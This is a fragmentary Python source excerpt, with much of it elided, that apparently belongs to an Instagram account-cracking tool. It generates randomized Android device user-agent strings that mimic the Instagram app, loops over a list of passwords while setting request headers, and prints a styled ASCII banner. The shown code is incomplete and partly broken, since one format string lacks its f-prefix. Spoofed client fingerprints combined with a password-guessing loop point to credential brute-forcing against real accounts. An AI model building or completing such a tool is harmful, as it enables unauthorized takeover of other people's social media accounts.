...
class Require:
    ...
    def vers(self):
        igv = ("23100.0.{str(rr(1111,6666))}.2")
        igve = igv.split(",")
    ...
    def UserAgent(self):
        ...
        dpis = rc(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi'])
        ...
        return(f'''Instagram {versi} Android ({andro}; {dpis}; {pxl}; Xiaomi; {redmis}; {kntlgoreng}; qcom; {basa}; {kode})''')
    ...
    def getUserAgentt(self):
        ...
        B = f"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/{build}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(75,120))}.0.{str(random.randint(4500,5500))}.{str(random.randint(75,150))} Mobile Safari/537.36 Instagram {versi} Android (27/8.1.0; {dpis}; {pxl}; vivo; vivo 1820; 1820; {com}; {basa}; {kode})"
        ...
        for pswd in password:
            try:
                 s.headers.update({
                      ...
                      'priority': 'u=3',
                      'user-agent': 'Instagram 275.0.0.27.98 Android (25/7.1.2; 240dpi; 720x1280; samsung; SM-N976N; dream2qltechn; qcom; in_ID; 458229257)',
...
██▪  ▐█·██ ▄▄▐▀▀▪▄▐█▐▐▌▄▀▀▀█▄▐▀▀▪▄
▐█▌▐▌▐█▌▐███▌▐█▄▄▌██▐█▌▐█▄▪▐█▐█▄▄▌
.▀▀▀ ▀▀▀·▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀▀  ▀▀▀ ''',width=56,padding=(0,9),style="turquoise2"))
